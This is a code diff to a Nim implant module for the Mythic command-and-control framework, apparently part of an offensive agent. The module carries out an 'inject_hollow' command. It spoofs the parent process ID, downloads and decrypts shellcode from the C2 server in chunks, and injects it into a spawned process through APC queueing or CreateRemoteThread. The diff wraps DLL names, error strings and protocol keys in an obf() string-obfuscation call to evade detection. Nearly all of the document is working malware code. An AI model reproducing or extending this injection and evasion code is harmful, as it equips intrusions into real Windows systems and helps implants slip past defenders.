@@ -2,6 +2,7 @@ import ../utils/mythic_responses
 import ../utils/debug
 import ../global_data
 import ../utils/crypto
+import ../utils/strenc
 import std/[json, strutils, strformat, base64]
 
 when defined(windows):
@@ -24,16 +25,16 @@ when defined(windows):
   proc InitializeProcThreadAttributeList(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST, 
                                          dwAttributeCount: DWORD, dwFlags: DWORD, 
                                          lpSize: ptr SIZE_T): WINBOOL
-    {.importc, dynlib: "kernel32.dll", stdcall.}
+    {.importc, dynlib: obf("kernel32.dll"), stdcall.}
   
   proc UpdateProcThreadAttribute(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST,
                                 dwFlags: DWORD, Attribute: DWORD_PTR, 
                                 lpValue: PVOID, cbSize: SIZE_T,
                                 lpPreviousValue: PVOID, lpReturnSize: ptr SIZE_T): WINBOOL
-    {.importc, dynlib: "kernel32.dll", stdcall.}
+    {.importc, dynlib: obf("kernel32.dll"), stdcall.}
   
   proc DeleteProcThreadAttributeList(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST): void
-    {.importc, dynlib: "kernel32.dll", stdcall.}
+    {.importc, dynlib: obf("kernel32.dll"), stdcall.}
 
 type
   InjectHollowArgs = object
@@ -54,7 +55,7 @@ when defined(windows):
       # PPID spoofing - use extended process creation
       let parentHandle = OpenProcess(PROCESS_CREATE_PROCESS or PROCESS_QUERY_INFORMATION, 0, DWORD(ppid))
       if parentHandle == 0:
-        return (false, pi, "Failed to open parent process: " & $GetLastError())
+        return (false, pi, obf("Failed to open parent process: ") & $GetLastError())
       
       # Initialize attribute list
       var size: SIZE_T = 0
@@ -65,14 +66,14 @@ when defined(windows):
       
       if InitializeProcThreadAttributeList(attrListPtr, 1, 0, addr size) == 0:
         CloseHandle(parentHandle)
-        return (false, pi, "Failed to initialize attribute list: " & $GetLastError())
+        return (false, pi, obf("Failed to initialize attribute list: ") & $GetLastError())
       
       # Update attribute with parent process handle
       if UpdateProcThreadAttribute(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                    addr parentHandle, SIZE_T(sizeof(HANDLE)), nil, nil) == 0:
         DeleteProcThreadAttributeList(attrListPtr)
         CloseHandle(parentHandle)
-        return (false, pi, "Failed to update attribute list: " & $GetLastError())
+        return (false, pi, obf("Failed to update attribute list: ") & $GetLastError())
       
       # Create process with extended startup info
       var siEx: STARTUPINFOEXA
@@ -96,7 +97,7 @@ when defined(windows):
       CloseHandle(parentHandle)
       
       if success == 0:
-        return (false, pi, "Failed to create process with PPID spoofing: " & $GetLastError())
+        return (false, pi, obf("Failed to create process with PPID spoofing: ") & $GetLastError())
     else:
       # Normal process creation without PPID spoofing
       var si: STARTUPINFOA
@@ -116,7 +117,7 @@ when defined(windows):
       )
       
       if success == 0:
-        return (false, pi, "Failed to create process: " & $GetLastError())
+        return (false, pi, obf("Failed to create process: ") & $GetLastError())
     
     return (true, pi, "")
 
@@ -126,7 +127,7 @@ proc injectViaAPC(shellcode: seq[byte]): tuple[success: bool, error: string] =
     try:
       # Validate shellcode
       if shellcode.len == 0:
-        return (false, "Shellcode is empty (0 bytes)")
+        return (false, obf("Shellcode is empty (0 bytes)"))
       
       # Get spawnto path based on architecture
       when hostCPU == "amd64":
@@ -135,7 +136,7 @@ proc injectViaAPC(shellcode: seq[byte]): tuple[success: bool, error: string] =
         let (spawntoPath, spawntoArgs) = getSpawntoX86()
       
       if spawntoPath.len == 0:
-        return (false, "spawnto path is not set for this architecture")
+        return (false, obf("spawnto path is not set for this architecture"))
       
       # Get PPID for spoofing
       let ppid = getPpid()
@@ -159,7 +160,7 @@ proc injectViaAPC(shellcode: seq[byte]): tuple[success: bool, error: string] =
         discard TerminateProcess(pi.hProcess, 0)
         CloseHandle(pi.hProcess)
         CloseHandle(pi.hThread)
-        return (false, &"VirtualAllocEx failed: {err} (size: {shellcode.len} bytes)")
+        return (false, obf("VirtualAllocEx failed: ") & $err & obf(" (size: ") & $shellcode.len & obf(" bytes)"))
       
       # Write shellcode to target process
       var bytesWritten: SIZE_T
@@ -168,7 +169,7 @@ proc injectViaAPC(shellcode: seq[byte]): tuple[success: bool, error: string] =
         discard TerminateProcess(pi.hProcess, 0)
         CloseHandle(pi.hProcess)
         CloseHandle(pi.hThread)
-        return (false, "WriteProcessMemory failed: " & $err)
+        return (false, obf("WriteProcessMemory failed: ") & $err)
       
       # Queue APC to suspended thread
       if QueueUserAPC(cast[PAPCFUNC](pRemote), pi.hThread, 0) == 0:
@@ -176,7 +177,7 @@ proc injectViaAPC(shellcode: seq[byte]): tuple[success: bool, error: string] =
         discard TerminateProcess(pi.hProcess, 0)
         CloseHandle(pi.hProcess)
         CloseHandle(pi.hThread)
-        return (false, "QueueUserAPC failed: " & $err)
+        return (false, obf("QueueUserAPC failed: ") & $err)
       
       # Resume thread to execute APC
       discard ResumeThread(pi.hThread)
@@ -188,7 +189,7 @@ proc injectViaAPC(shellcode: seq[byte]): tuple[success: bool, error: string] =
     except Exception as e:
       return (false, "Exception: " & e.msg)
   else:
-    return (false, "Not on Windows")
+    return (false, obf("Not on Windows"))
 
 proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, error: string] =
   ## Inject shellcode using CreateRemoteThread technique
@@ -196,7 +197,7 @@ proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, err
     try:
       # Validate shellcode
       if shellcode.len == 0:
-        return (false, "Shellcode is empty (0 bytes)")
+        return (false, obf("Shellcode is empty (0 bytes)"))
       
       # Get spawnto path based on architecture
       when hostCPU == "amd64":
@@ -205,7 +206,7 @@ proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, err
         let (spawntoPath, spawntoArgs) = getSpawntoX86()
       
       if spawntoPath.len == 0:
-        return (false, "spawnto path is not set for this architecture")
+        return (false, obf("spawnto path is not set for this architecture"))
       
       # Get PPID for spoofing
       let ppid = getPpid()
@@ -229,7 +230,7 @@ proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, err
         discard TerminateProcess(pi.hProcess, 0)
         CloseHandle(pi.hProcess)
         CloseHandle(pi.hThread)
-        return (false, &"VirtualAllocEx failed: {err} (size: {shellcode.len} bytes)")
+        return (false, obf("VirtualAllocEx failed: ") & $err & obf(" (size: ") & $shellcode.len & obf(" bytes)"))
       
       # Write shellcode to target process
       var bytesWritten: SIZE_T
@@ -238,7 +239,7 @@ proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, err
         discard TerminateProcess(pi.hProcess, 0)
         CloseHandle(pi.hProcess)
         CloseHandle(pi.hThread)
-        return (false, "WriteProcessMemory failed: " & $err)
+        return (false, obf("WriteProcessMemory failed: ") & $err)
       
       # Create remote thread
       var threadId: DWORD
@@ -257,7 +258,7 @@ proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, err
         discard TerminateProcess(pi.hProcess, 0)
         CloseHandle(pi.hProcess)
         CloseHandle(pi.hThread)
-        return (false, "CreateRemoteThread failed: " & $err)
+        return (false, obf("CreateRemoteThread failed: ") & $err)
       
       CloseHandle(hRemoteThread)
       CloseHandle(pi.hProcess)
@@ -267,7 +268,7 @@ proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, err
     except Exception as e:
       return (false, "Exception: " & e.msg)
   else:
-    return (false, "Not on Windows")
+    return (false, obf("Not on Windows"))
 
 proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode
 
@@ -283,19 +284,19 @@ proc injectHollow*(taskId: string, params: JsonNode): JsonNode =
       
       # Return initial response - request the file from Mythic
       return %*{
-        "task_id": taskId,
-        "upload": {
-          "file_id": args.uuid,
-          "chunk_num": 1,
-          "chunk_size": 512000,
-          "full_path": ""
+        obf("task_id"): taskId,
+        obf("upload"): {
+          obf("file_id"): args.uuid,
+          obf("chunk_num"): 1,
+          obf("chunk_size"): 512000,
+          obf("full_path"): ""
         }
       }
       
     except Exception as e:
-      return mythicError(taskId, "Inject hollow error: " & e.msg)
+      return mythicError(taskId, obf("Inject hollow error: ") & e.msg)
   else:
-    return mythicError(taskId, "inject_hollow command is only available on Windows")
+    return mythicError(taskId, obf("inject_hollow command is only available on Windows"))
 
 proc processInjectHollowChunk*(taskId: string, params: JsonNode, chunkData: string, 
                                totalChunks: int, currentChunk: int, 
@@ -315,12 +316,12 @@ proc processInjectHollowChunk*(taskId: string, params: JsonNode, chunkData: stri
       # If more chunks remain, request the next one
       if currentChunk < totalChunks:
         return %*{
-          "task_id": taskId,
-          "upload": {
-            "chunk_size": 512000,
-            "file_id": args.uuid,
-            "chunk_num": currentChunk + 1,
-            "full_path": ""
+          obf("task_id"): taskId,
+          obf("upload"): {
+            obf("chunk_size"): 512000,
+            obf("file_id"): args.uuid,
+            obf("chunk_num"): currentChunk + 1,
+            obf("full_path"): ""
           }
         }
       
@@ -328,9 +329,9 @@ proc processInjectHollowChunk*(taskId: string, params: JsonNode, chunkData: stri
       return executeInjectHollow(taskId, fileData, params)
       
     except Exception as e:
-      return mythicError(taskId, "Inject hollow chunk processing error: " & e.msg)
+      return mythicError(taskId, obf("Inject hollow chunk processing error: ") & e.msg)
   else:
-    return mythicError(taskId, "inject_hollow command is only available on Windows")
+    return mythicError(taskId, obf("inject_hollow command is only available on Windows"))
 
 proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode =
   ## Execute the shellcode injection after download is complete
@@ -340,7 +341,7 @@ proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode
       
       # Validate shellcode was received
       if shellcode.len == 0:
-        return mythicError(taskId, "Shellcode is empty - file download may have failed")
+        return mythicError(taskId, obf("Shellcode is empty - file download may have failed"))
       
       var finalShellcode = shellcode
       # Decrypt shellcode if encryption is specified
@@ -350,25 +351,25 @@ proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode
           decryptPayload(finalShellcode, args.encryption, args.key, args.iv, args.nonce)
           debug &"[+] Decryption successful ({finalShellcode.len} bytes)"
         except Exception as e:
-          return mythicError(taskId, &"Decryption failed: {e.msg}")
+          return mythicError(taskId, obf("Decryption failed: ") & e.msg)
       
       debug &"[DEBUG] Injecting shellcode ({finalShellcode.len} bytes) via {args.technique}"
       
       var result: tuple[success: bool, error: string]
       case args.technique.toLower():
-      of "apc":
+      of obf("apc"):
         result = injectViaAPC(finalShellcode)
-      of "createremotethread":
+      of obf("createremotethread"):
         result = injectViaCreateRemoteThread(finalShellcode)
       else:
-        return mythicError(taskId, &"Unknown injection technique: {args.technique}")
+        return mythicError(taskId, obf("Unknown injection technique: ") & args.technique)
       
       if result.success:
-        return mythicSuccess(taskId, &"Shellcode injected successfully via {args.technique}")
+        return mythicSuccess(taskId, obf("Shellcode injected successfully via ") & args.technique)
       else:
-        return mythicError(taskId, &"Failed to inject shellcode via {args.technique}: {result.error}")
+        return mythicError(taskId, obf("Failed to inject shellcode via ") & args.technique & ": " & result.error)
       
     except Exception as e:
-      return mythicError(taskId, "Inject hollow execution error: " & e.msg)
+      return mythicError(taskId, obf("Inject hollow execution error: ") & e.msg)
   else:
-    return mythicError(taskId, "inject_hollow command is only available on Windows")
+    return mythicError(taskId, obf("inject_hollow command is only available on Windows"))
